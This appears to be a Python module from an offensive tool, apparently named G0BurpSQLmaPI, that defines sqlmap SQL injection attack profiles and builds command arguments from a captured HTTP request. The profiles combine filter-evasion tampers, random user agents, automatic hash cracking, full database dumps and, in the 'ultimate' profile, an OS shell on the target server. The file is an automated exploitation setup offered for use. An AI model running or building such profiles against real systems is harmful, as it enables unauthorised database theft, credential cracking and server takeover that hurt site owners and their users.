# lib/payloads.py

# ============================
# SQLMAP default tamper set
# ============================
TAMPERS = "between,randomcase,space2comment"

# ============================
# SQLMAP attack profiles (menu)
# ============================
SQLMAP_PROFILES = {
    "aggressive": {
        "name": "🔥 AGGRESSIVE",
        "description": "Fast scanning profile with medium noise",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=2",
            "--level=3",
            f"--tamper={TAMPERS}",
            "--dump"
        ],
    },

    "stealth": {
        "name": "🛡️ STEALTH",
        "description": "Low-noise bypass mode",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=1",
            "--level=1",
            "--technique=E",
            f"--tamper={TAMPERS}",
            "--dump"
        ],
    },

    "time_based": {
        "name": "⏱️ TIME-BASED",
        "description": "Blind SQLi timing attack",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=3",
            "--level=5",
            "--technique=T",
            "--dump"
        ],
    },

    "full_dump": {
        "name": "📊 FULL DUMP",
        "description": "Dump entire databases",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--dump-all",
            "--risk=3",
            "--level=5",
            f"--tamper={TAMPERS}",
            "--dump"
        ],
    },

    "ultimate": {
        "name": "💀 ULTIMATE",
        "description": "Maximum brute force & enumeration",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=3",
            "--level=5",
            "--threads=10",
            "--technique=BEUSTQ",
            "--os-shell",
            f"--tamper={TAMPERS}",
            "--dump"
        ],
    },

    "custom": {
        "name": "⚙️ CUSTOM",
        "description": "User-defined SQLmap flags",
        "options": [],
    },

    # ============================
    # DEFAULT FULL — now LAST
    # ============================
    "default_full": {
        "name": "⭐ DEFAULT FULL",
        "description": "Original G0BurpSQLmaPI default heavy flags",
        "options": [
            "--tamper=space2comment",
            "--dbms=mysql",
            "--time-sec=11",
            "--random-agent",
            "--level=5",
            "--risk=3",
            "--batch",
            "--flush-session",
            "--technique=BEUSTQ",
            "--union-char=UCHAR",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--dump"
        ],
    },
}


def get_attack_profile(name: str):
    """Return profile options by name; fallback to aggressive."""
    return SQLMAP_PROFILES.get(name, SQLMAP_PROFILES["aggressive"])["options"]


def get_sqlmap_default_args(MODULES_EXPLOIT_PATH, params_flag, profile="default_full"):
    """
    Build SQLmap args from exploit path, params list, and chosen profile.
    """
    args = ["-r", str(MODULES_EXPLOIT_PATH), *params_flag]

    # If a valid profile exists, append it
    profile_opts = SQLMAP_PROFILES.get(profile)
    if profile_opts:
        args += profile_opts["options"]
    else:
        # Fallback to default_full
        args += SQLMAP_PROFILES["default_full"]["options"]

    return args
